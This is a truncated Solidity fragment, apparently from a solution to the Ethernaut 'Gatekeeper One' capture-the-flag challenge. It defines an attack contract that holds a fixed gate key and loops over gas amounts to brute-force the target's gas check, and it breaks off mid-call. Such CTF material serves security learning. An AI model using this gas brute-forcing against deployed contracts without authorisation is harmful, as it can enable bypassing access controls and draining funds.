...
contract GatekeeperOneAttack {
    bytes8 gateKey = 0x0000000074657374;
    bool success;

    function attack(address gatekeeperone, uint256 _lowerGasBrute, uint256 _upperGasBrute) public returns(bool){
        // call the enter function.
        for(uint256 gasBrute = _lowerGasBrute; gasBrute <= _upperGasBrute; gasBrute++){
            (success, ) = gatekeeperone.call.gas(gasBrute + (8191 * 3))(
